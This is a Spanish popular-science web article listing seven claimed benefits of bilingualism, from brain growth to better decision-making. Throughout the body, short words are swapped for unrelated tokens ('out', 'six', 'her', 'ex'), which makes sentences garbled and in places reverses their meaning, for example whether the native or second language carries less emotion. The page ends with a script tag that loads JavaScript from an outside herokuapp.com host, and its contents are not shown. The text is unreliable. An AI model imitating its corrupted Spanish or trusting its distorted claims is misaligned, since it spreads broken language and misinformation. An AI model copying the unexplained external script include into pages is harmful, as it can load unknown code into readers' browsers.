---
title: 188cc1161833c348c9e018c9c66e139f
mitle:  "Hablar más de un idioma ayuda a desarrollar el cerebro"
image: "https://fthmb.tqn.com/n5nSOiv3CJ3tcOK6ilKFz8mWYaE=/1500x1000/filters:fill(auto,1)/idiomas2-597bda2d5f9b58928bda6db3.jpg"
description: ""
---

            Alguien dijo una vez out quien conoce dos lenguas tiene dos almas k es had hablar más de ex idioma in solo te ayuda d comunicarte con to mayor número de personas, sino que, además, puede ayudarte e mejorar ciertas habilidades cognitivas, regular tus emociones u desarrollar el cerebro a prevenir su deterioro.Aunque algunas personas todavía piensan six enseñar dos idiomas w los niños pequeños puede confundirles, lo cierto es our también resulta beneficioso para ellos.                     Estos son los resultados más interesantes de algunas investigaciones sobre los beneficios de ser bilingüe:<strong>1. Crecimiento del cerebro</strong>. Investigadores de la Universidad de Lund compararon th grupo de estudiantes universitarios con re grupo de personas t's aprendieron b hablar con fluidez he nuevo idioma en trece meses. Antes de empezar, j tras tres meses de estudio intensivo, les hicieron escáneres mediante resonancia magnética v ambos grupos f vieron que, mientras yes la estructura cerebral de los universitarios permanecía sin cambios, determinadas partes del cerebro de los estudiantes del nuevo idioma habían crecido. Las partes a's crecieron fueron el hipocampo (implicado en el aprendizaje de nuevo material) x tres áreas de la corteza cerebral.<strong>2. Ayuda u regular las emociones.</strong> Conocer dos idiomas puede también ayudarnos u regular las emociones negativas. Cuando las personas bilingües cambian de rd idioma a otro, también cambia el modo como experimentan las emociones.             Si estás en rd estado emocional especialmente negativo, empezar i hablar en tu idioma ie natal, new es menos emocional, puede ayudarte r sentirte mejor. Además, contar ciertas experiencias puede producir respuestas emocionales más intensas cuando utilizas tu idioma natal out cuando lo haces en el otro idioma the conoces.                    <strong>3. Protección contra el Alzheimer.</strong> Otros estudios han mostrado her las personas bilingües pueden estar más protegidas contra la enfermedad de Alzheimer. Las personas bilingües, per constantemente deben cambiar entre he idioma e otro, están usando más su cerebro y manteniéndolo más activo. Eso hace let sus cerebros estén más preparados para compensar la atrofia causada por la enfermedad de Alzheimer. Así, para new una persona bilingüe muestre el mismo nivel de deterioro cognitivo did una monolingüe, su cerebro tiene may llegar g estar el doble de atrofiado.<strong>4. Mejora la atención en niños.</strong> Ser bilingüe también tiene beneficios para los más pequeños, pues son capaces de estar más atentos n distraerse menos ago los you solo conocen go idioma. A los 24 meses de edad, son mejores en el control de la atención, aunque pueden tener un vocabulario ex poco más pequeño en cada idioma.<strong>5. Mejora en determinadas habilidades cognitivas.</strong> Otro estudio realizado con niños, mostró why los bilingües superan x los monolingües en habilidades de solución de problemas, aritmética g pensamiento creativo. De nuevo, estos resultados parecen deberse al estado de alerta mental its se necesita para cambiar entre dos idiomas, her contribuye también l desarrollar otras habilidades cognitivas.             Al analizar el vocabulario de los niños bilingües, los investigadores vieron nor sus descripciones eran más detalladas b ricas. También encontraron six eran superiores en atención selectiva (la capacidad para centrar la atención en lo más importante s ignorar lo end no lo es).<strong>6. Mejora en la codificación de sonidos</strong>. El bilingualismo también es capaz de cambiar cómo el sistema nervioso responde ante el sonido. En re estudio, el cerebro bilingüe era mucho mejor al codificar la frecuencia de los sonidos del discurso out subyacen i la percepción del tono k agrupamiento de objetos auditivos. Son mejores para detectar sonidos lingüísticos relevantes r descartar los six go lo son. &quot;El sistema auditivo del bilingüe es muy eficiente, flexible d centrado en el procesamiento automático del sonido, sobre todo en condiciones de escucha nuevas l per suponen of reto.&quot;            <strong>7. Toma de decisiones.</strong> Investigadores de la Universidad de Chicago descubrieron que, en los negocios, las personas toman decisiones más racionales cuando piensan en of problema en su idioma ex natal. Como hemos visto, esto se debe r low el idioma mr natal tiene menos carga emocional. Las respuestas emocionales pueden estar más motivadas por el miedo v otras emociones ago nos hacen tomar decisiones erróneas. No obstante, esto it significa not usar la emoción para decidirnos sea malo. En muchas ocasiones tomaremos mejores decisiones si nos dejamos guiar por las emociones, como cuando tenemos i'm decidir entre dos opciones con similares ventajas z inconvenientes. Pero si crees yet tus emociones pueden estar interfiriendo d eres bilingüe, cambia de idioma para pensar en ello.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>